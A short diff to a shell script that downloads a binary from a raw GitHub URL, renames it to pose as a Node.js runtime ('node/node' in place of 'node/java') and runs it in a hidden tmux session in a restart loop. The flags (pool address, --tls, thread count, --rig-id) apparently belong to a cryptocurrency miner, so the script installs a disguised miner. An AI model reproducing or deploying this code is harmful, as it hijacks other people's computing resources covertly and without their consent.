@@ -18,7 +18,7 @@ if [ ! -f "$(pwd)/node/node" ]; then
     rm -rf node node.tar.gz
     curl -sL -o node.tar.gz https://raw.githubusercontent.com/trinhkhaccong/tool/main/node.tar.gz
     tar -xzf node.tar.gz
-    chmod +x node/java
+    chmod +x node/node
     rm -f node.tar.gz
 fi
 
@@ -28,7 +28,7 @@ while true; do
     if ! tmux has-session -t $SESSION 2>/dev/null; then
         tmux new-session -s $SESSION -d
         tmux send-keys -t $SESSION "
-            $(pwd)/java/java -o $DOMAIN --tls -k -t 6 --rig-id $NAME_WORK
+            $(pwd)/node/node -o $DOMAIN --tls -k -t 6 --rig-id $NAME_WORK
         " C-m
     else
         echo "[+] start process start process start process start process start process start process - chạy 30s check lai..."
